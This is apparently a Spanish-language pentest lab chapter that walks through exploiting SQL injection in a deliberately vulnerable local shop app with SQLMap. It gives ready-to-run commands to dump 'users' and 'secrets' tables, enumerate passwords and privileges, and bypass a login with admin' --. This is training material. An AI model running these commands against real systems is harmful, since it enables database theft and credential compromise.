# 03 — Explotación automatizada con SQLMap

> App vulnerable en `http://localhost:3000`. Usar `--batch` (no interactivo) y
> `--flush-session` para repetir limpio.

## 3.1 — Agresividad: `--level` y `--risk`

| Opción | Rango | Qué cambia |
|---|---|---|
| `--level` | 1–5 | Puntos probados (GET/POST, Cookie en ≥2, headers en ≥3) y cantidad de payloads |
| `--risk` | 1–3 | Agresividad: 1 seguro; 2 agrega time-based pesados; 3 agrega `OR`-based |

Estrategia: empezar en `--level 1 --risk 1` y subir si no detecta.

## 3.2 — Técnicas (`--technique`)
`B`=Boolean blind, `E`=Error-based, `U`=Union, `S`=Stacked, `T`=Time-based.
Por defecto prueba `BEUSTQ`. Para aislar una: `--technique=U`.

---

## 3.3 — Vulnerabilidad 2: Buscador (GET `q`)

### Detección
```
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch
```
### Volcado (UNION / extracción de datos)
```
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch --dbs
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch -D shopdb --tables
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch -D shopdb -T users   --dump
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch -D shopdb -T secrets --dump
```

---

## 3.4 — Vulnerabilidad 1: Login (POST)

### Opción A: datos POST en línea
```
sqlmap -u "http://localhost:3000/login" \
       --data="username=admin&password=x" -p username \
       --batch --level 2 --risk 2 --dbs
```
### Opción B: request guardado de Burp (recomendado)
1. En Burp: *Save item* → `login.req`.
2. `sqlmap -r login.req -p username --batch -D shopdb -T users --dump`

> El login también permite el *bypass* manual (`admin' -- `); SQLMap sirve para
> confirmar la inyección y enumerar/volcar a partir de ese punto.

---

## 3.5 — Reconocimiento de privilegios (para el capítulo de impacto)
```
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch \
       --banner --current-user --current-db --is-dba \
       --users --passwords --privileges
```
- `--is-dba` → en `app-vuln` devuelve **True**.
- `--privileges` → muestra `FILE` (habilita lectura/escritura de archivos; ver cap. 04).

---

## 3.6 — Enumeración completa (una corrida "a fondo")
```
sqlmap -u "http://localhost:3000/?q=teclado" -p q --batch \
       --level 5 --risk 3 --threads 4 \
       --dbs --output-dir=./evidencias/sqlmap
```

## 3.7 — Buenas prácticas
- `--batch` para repetibilidad; `--flush-session` para empezar de cero.
- `--threads 4` acelera; `--delay`/`--time-sec` ajustan técnicas blind.
- Documentar la salida de cada técnica en `evidencias/`.

El impacto (volcado completo, archivos, os-shell) se desarrolla en `04-impacto.md`.
